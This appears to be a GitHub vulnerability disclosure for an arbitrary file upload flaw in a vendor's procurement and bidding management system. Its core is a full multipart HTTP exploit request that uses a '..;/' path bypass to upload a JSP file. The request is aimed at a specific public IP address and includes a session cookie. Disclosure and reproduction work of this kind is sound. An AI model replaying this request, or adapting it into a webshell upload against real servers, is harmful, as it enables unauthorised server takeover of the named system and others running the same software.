# Procurement-and-bidding-management-system
There is an arbitrary file upload vulnerability in the procurement and bidding management system
Recurrence of vulnerabilities
1.Problem Description 
There is an arbitrary file upload vulnerability in the procurement and bidding management system of Guangdong Guangling Information Technology Co., Ltd., which can be exploited by attackers to control server permissions.
2.Case reproduction As shown, this is a test site
![image](https://github.com/dubin12345/Procurement-and-bidding-management-system/assets/144758348/51b72abc-c6d8-4dc6-b25e-4082ac71867e)

3.Upload a 1. JSP file with the content of test by constructing malicious data packets

![image](https://github.com/dubin12345/Procurement-and-bidding-management-system/assets/144758348/11ced168-2ef7-4f3d-9162-04446305b6b8)
4.Vulnerability exploit packets
POST //api/..;/commonController.do?parserXml HTTP/1.1
Host: 219.222.48.58
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: siteTitle=%E6%B1%9F%E8%8B%8F%E4%BC%98%E6%89%AC%E8%8D%AF%E4%B8%9A%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8; JSESSIONID=00427D97395E082CCCD88C7A8B6A85C3
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryf1BWcBSfJB2Bf4Zm
Content-Length: 183

------WebKitFormBoundaryf1BWcBSfJB2Bf4Zm
Content-Disposition: form-data; name="file"; filename="1.jsp"
Content-Type: text/plain

test
------WebKitFormBoundaryf1BWcBSfJB2Bf4Zm—

5.Affected version:=V1.0
